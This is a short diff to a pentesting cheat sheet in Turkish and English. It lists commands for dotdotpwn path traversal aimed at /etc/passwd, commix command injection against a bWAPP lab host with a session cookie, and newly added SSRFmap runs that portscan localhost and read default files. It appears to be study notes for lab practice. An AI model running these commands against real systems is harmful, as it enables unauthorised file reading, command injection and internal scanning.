@@ -28,3 +28,13 @@ dotdotpwn -m payload -h 192.168.1.1 -p istek.txt -o unix /etc/passwd -d -x 80 -b
 commix --url="<urlburyagelecek>" --cookie="<cookie burayagelecek>" --data="gonderilenveri" 
 //data yi araya girerkenn burpsuite ile giden verileri alarak koyuyoruz
 ornek = commix --url="http://192.168.1.53/bWAPP/commandi.php" --cookie="security_level=0; PHPSESSID=25e38d9b81559ec78aba39ce0077cc72" --data="target=www.nsa.gov&form=submit"
+
+
+# Ssrf Map
+Launch a portscan on localhost and read default files
+python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan -> Burp suite ile isteği yakala ve requests.txt adından kaydet.
+
+Launch a portscan against an HTTPS endpoint using a custom user-agent
+python ssrfmap.py -r data/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
+Daha fazla bilgi için https://github.com/swisskyrepo/SSRFmap.
+
